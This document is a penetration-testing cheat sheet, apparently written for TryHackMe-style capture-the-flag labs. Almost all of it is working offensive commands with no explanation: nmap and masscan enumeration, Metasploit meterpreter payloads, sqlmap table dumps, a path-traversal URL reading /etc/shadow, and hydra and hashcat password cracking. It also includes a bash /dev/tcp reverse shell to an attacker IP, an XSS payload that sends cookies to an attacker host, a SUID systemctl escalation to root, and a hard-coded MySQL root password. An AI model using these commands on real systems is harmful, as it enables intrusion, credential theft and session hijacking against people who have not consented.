# Cheat Sheet

## Enumeration

sudo masscan -e tun0 -p1-65535,U:1-65535 10.10.1.109 --rate=1000 (quick open port scan)

nmap -sV -v -Pn -n -p8000,9300,22,5601,1111,9200 10.10.1.109 (then scan the ports found with masscan)

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.119.138 (enum samba shares)

nmap -sV -p- 10.10.10.10 (service scan)

nmap -A -T4 --script vuln -p- 10.10.10.10 (full scan)

nmap -sV -vv --script vuln 10.10.10.10 (vuln scan)
  
nmap -O 10.10.10.10 (operating system scan) 

nikto -host 10.10.200.161 (web scan)

enum4linux -a 10.10.26.102 | tee enum4linuxOutput.log

## Linux

cat /etc/passwd (get list of users)

sudo cat /etc/shadow (hash of password)

find / -type f -perm -o+w 2>/dev/null (find files with write permissions)

## msfconsole

db_nmap -sV BOX-IP

use shell_to_meterpreter

set payload payload/linux/x86/meterpreter/reverse_tcp

run post/multi/recon/local_exploit_suggester

load kiwi (creds_all)

***spawn shell from meterpreter***

shell

script -qc /bin/bash /dev/null 

## FTP

ftp 10.10.10.10

user: anonymous
password: anonymous

scp linpeas.sh jan@10.10.122.69:/dev/shm

## mysql 

mysql -h 10.10.28.115 -u(root) -p(ff912ABD*)

show databases;

use data;

select * from USERS;

## sql injection

sqlmap -u 10.10.115.80/register.php --data "log_email=test&log_password=test&login_button=Login" --method POST -p "log_email,log_password" --level=3 --batch

sqlmap -u 10.10.87.14/register.php --data "log_email=test&log_password=test&login_button=Login" --method POST -p "log_email,log_password" --level=3 --dbms=mysql 5.02 --batch -D social --columns -T users --dump

## website

http://10.10.58.44/get-file/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow

## mountd (mount NFS drive)

/sbin/showmount -e 10.10.10.10 

sudo mkdir /mnt/thm

mount 10.10.10.10:/opt/files /mnt/thm

sudo umount -f -l thm

## gobuster

gobuster dir -u http://ip:port -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

## crack passwords

hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.212.195 -t 4 http-form-post "/login:username=^USER^&password=^PASS^:F=incorrect" (web login portal password)

hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.212.195 -t 4 ssh

hydra -l sam -P /usr/share/wordlists/rockyou.txt 10.10.120.174 -t 4 -s 4567 ssh (ssh port 4567)

fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v ./christmaslists.zip (zip password)

hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt --force (crack hash)

hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --force (crack hash md5)

| hashid        | hashcat |
|---------------|---------|
| SHA-512 Crypt | 1800    |
|               |         |
|               |         |

## Encryption

pg -d note1.txt.gpg (decrypt gpg)

steghide extract -sf ./TryHackMe.jpg (stenography)

binwalk cutie.png

binwalk cutie.png -e (extract hidden files)

openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out file.txt (asymmetric decryption using private key) 

## cmd to start reverse shell 

bash -i >& /dev/tcp/10.9.46.252/1234 0>&1

## listen for reverse shell

netcat -lvnp 1234 (or nc)

python -c "import pty; pty.spawn('/bin/bash')"

control+z

stty raw -echo

fg

press enter a few times

export TERM=xterm

## XSS 

<script> new Image().src = "http://myIP:1234/stolencookie.php?cookie="+document.cookie;</script> (payload)

ncat -lkvnp 1234 (listen to payload)

# privilege escalation using SUID

find / -user root -perm -4000 2>> /dev/null (find SUID files)

***find***

find filename -exec cat /home/igor/flag1.txt \; 

***systemctl***

TF=$(mktemp).service

echo '[Service]

Type=oneshot

ExecStart=/bin/sh -c "chmod +s /bin/bash"

[Install]

WantedBy=multi-user.target' > $TF

/bin/systemctl link $TF

/bin/systemctl enable --now $TF

bash -p

## ssh with private key

/usr/share/john/ssh2john.py key > forjohn

/usr/sbin/john forjohn --wordlist=/usr/share/wordlists/rockyou.txt

chmod 600 key

ssh -i key kay@10.10.122.69

## linpeas

host on own computer
ls to directory

```
sudo python -m SimpleHTTPServer
```

get on box

```
wget http://10.4.9.144:8000/linpeas.sh
```
